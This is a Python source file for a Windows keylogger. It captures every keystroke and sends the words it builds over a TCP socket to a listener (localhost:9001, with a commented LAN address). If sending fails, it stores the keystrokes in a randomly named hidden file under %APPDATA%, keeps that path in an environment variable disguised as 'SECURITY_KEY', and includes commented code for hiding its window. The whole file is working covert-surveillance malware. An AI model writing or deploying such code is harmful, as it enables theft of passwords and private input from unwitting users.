# encoding=latin1

import queue
import socket
from os import getenv, mkdir, path
from random import choice
from string import ascii_letters, ascii_uppercase
from subprocess import PIPE, run
from typing import Sequence

from keyboard import *


def random_string(size, charset):
	"""
	Generates a random string of a given size using the passed charset

	:param size: The length of the generated string
	:type size: int
	:param charset: The set of characters to choose from
	:type charset: Sequence
	:return: A randomly generated string
	:rtype: str
	"""
	return ''.join(choice(charset) for _ in range(size))


def create_random_dir_and_file():
	"""
	If the logger already created a random hidden directory, returns this path.
	Otherwise, creates a random file within a random directory, stores the path in the
	environment variable SECURITY_KEY and returns it.

	:return: Either the generated path, or the one that was saved in environment variables
	:rtype: str
	"""

	saved_path = getenv("SECURITY_KEY", None)
	# If it exists, we check if it maps to a valid dir
	if saved_path is not None:
		try:
			x = open(saved_path, "a")
			x.close()
		except FileNotFoundError:
			# The environment var exists but the directory was deleted
			# -> recreate one and update env var
			saved_path = None

	if saved_path is None:
		random_directory_name = random_string(15, ascii_uppercase)
		random_directory_path = path.expandvars("%appdata%\\" + random_directory_name)
		random_file = random_string(15, ascii_letters)
		mkdir(random_directory_path)

		final = random_directory_path + "\\" + random_file

		# Set env var as new random file in new random dir
		result = run(["setx", "SECURITY_KEY", final], check=False, stderr=PIPE).stderr

		if result is not None:
			# Somehow couldnt create environment variable
			return None

		return final

	return saved_path


class Logger:
	def __init__(self, host: str, port: int, log_file: str):
		self.input_queue = start_recording()[0]
		self.output_queue = queue.Queue()
		self.current_string = ''
		self.address = (host, port)
		self.serving = True
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.filename = log_file

	def init_conn(self) -> None:
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.socket.connect(self.address)

	def on_event(self, event: KeyboardEvent) -> None:
		name, event_type = event.name, event.event_type
		if name in ["space", "enter"] and self.current_string:
			if name == "enter":
				self.current_string += "ENTER"
			self.output_queue.put(self.current_string)
			self.current_string = ""
			return
		if name == "backspace" and event_type == "down":
			self.current_string += "BACKSPACE"
			return
		if name in ["ctrl", "alt", "tab"]:
			if event_type == "up":
				self.current_string += name.upper()
			return
		if event_type == "down" and name not in ["maj", "space", "enter"]:
			self.current_string += event.name

	def publish(self) -> bool:
		try:
			self.init_conn()
		except ConnectionRefusedError:
			return False
		while self.output_queue.qsize():
			current = self.output_queue.get() + " "
			self.socket.send(current.encode(encoding="latin-1", errors="ignore"))
			try:
				response = self.socket.recv(32)
				if response == b"OK":
					self.output_queue.task_done()
			except ConnectionAbortedError:
				return False
		self.socket.close()
		return True

	def handle_input(self) -> None:
		while self.serving:
			event = self.input_queue.get()
			self.on_event(event)
			self.input_queue.task_done()
			if self.output_queue.qsize() >= 10:
				if not self.publish():
					with open(self.filename, "a") as _:
						while self.output_queue.qsize():
							current = self.output_queue.get() + " "
							_.write(current)
							self.output_queue.task_done()


if __name__ == '__main__':
	file = create_random_dir_and_file()

	if file is None:
		# Somehow couldnt create environment variable, so no use creating a directory
		# -> storing in Appdata\Local\Temp
		file = path.expandvars("%TMP%" + "\\" + random_string(15, ascii_letters))

	logger = Logger("localhost", 9001, file)  # 192.168.1.38
	# this_window = win32gui.GetForegroundWindow()
	# win32gui.ShowWindow(this_window, win32con.SW_HIDE)
	logger.handle_input()
